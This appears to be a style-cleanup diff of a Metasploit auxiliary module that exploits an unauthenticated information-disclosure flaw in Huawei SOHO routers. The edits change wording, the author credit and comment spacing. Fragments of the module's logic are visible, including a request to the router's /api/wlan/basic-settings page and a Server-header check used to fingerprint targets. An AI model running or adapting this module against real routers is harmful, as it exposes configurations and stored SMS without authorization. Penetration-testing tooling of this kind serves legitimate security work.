@@ -55,16 +55,16 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => "Huawei Datacard Information Disclosure Vulnerability",
       'Description'    => %q{
-        This module exploits an un-authenticated information disclosure vulnerability in Huawei
+        This module exploits an unauthenticated information disclosure vulnerability in Huawei
         SOHO routers. The module will gather information by accessing the /api pages where
         authentication is not required, allowing configuration changes as well as information
-        disclosure including any stored SMS.
+        disclosure, including any stored SMS.
       },
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Jimson K James.',
-          '<tomsmaily[at]aczire.com>', # Msf module
+          'Jimson K James',
+          'Tom James <tomsmaily[at]aczire.com>', # Msf module
         ],
       'References'     =>
         [
@@ -82,7 +82,7 @@ class Metasploit3 < Msf::Auxiliary
 
   end
 
-  #Gather basic router information
+  # Gather basic router information
   def run
     get_router_info
     print_line('')
@@ -168,7 +168,7 @@ class Metasploit3 < Msf::Auxiliary
         'uri'     => '/api/wlan/basic-settings',
       })
 
-    #check whether we got any response from server and proceed.
+    # check whether we got any response from server and proceed.
     unless is_target?(res)
       return nil
     end
@@ -273,19 +273,19 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def is_target?(res)
-    #check whether we got any response from server and proceed.
+    # check whether we got any response from server and proceed.
     unless res
       print_error("#{peer} - Failed to get any response from server")
       return false
     end
 
-    #Is it a HTTP OK
+    # Is it a HTTP OK
     unless res.code == 200
       print_error("#{peer} - Did not get HTTP 200, URL was not found")
       return false
     end
 
-    #Check to verify server reported is a Huawei router
+    # Check to verify server reported is a Huawei router
     unless res.headers['Server'].match(/IPWEBS\/1.4.0/i)
       print_error("#{peer} - Target doesn't seem to be a Huawei router")
       return false
